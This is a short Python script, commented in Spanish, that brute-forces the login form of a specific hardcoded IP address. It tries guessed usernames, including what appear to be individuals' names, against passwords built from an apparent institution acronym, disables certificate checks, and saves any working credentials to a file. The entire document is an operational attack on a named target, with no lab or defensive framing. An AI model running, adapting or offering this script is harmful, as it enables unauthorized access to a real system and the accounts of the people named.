#!/usr/bin/env python3
import requests

target = "https://189.254.143.102/"
users = ["hnieto", "harriaga", "admin", "administrador", "sysadmin", "root"]
passwords = ["utslp", "Utslp2024", "UTSLP", "password", "admin", "123456", "hnieto", "harriaga"]

def try_login(user, password):
    data = {
        "yAccion": "Iniciar_Sesion",
        "yIntentos": "1", 
        "yUsuario": user,
        "xUsuario": user,
        "xContrasena": password
    }
    
    try:
        response = requests.post(target, data=data, verify=False, timeout=10)
        # Buscar indicadores de éxito
        if "location" in response.headers or "Bienvenido" in response.text or "bienvenido" in response.text:
            return True, response
        # Si no hay mensaje de error, podría ser éxito
        if "incorrectos" not in response.text and len(response.text) != 16038:
            return True, response
    except Exception as e:
        print(f"Error: {e}")
    
    return False, None

print("[+] Fuerza bruta contextual...")
for user in users:
    for password in passwords:
        success, response = try_login(user, password)
        if success:
            print(f"[¡ÉXITO!] {user}:{password}")
            print(f"Status: {response.status_code if response else 'N/A'}")
            with open("credenciales_encontradas.txt", "w") as f:
                f.write(f"{user}:{password}")
            break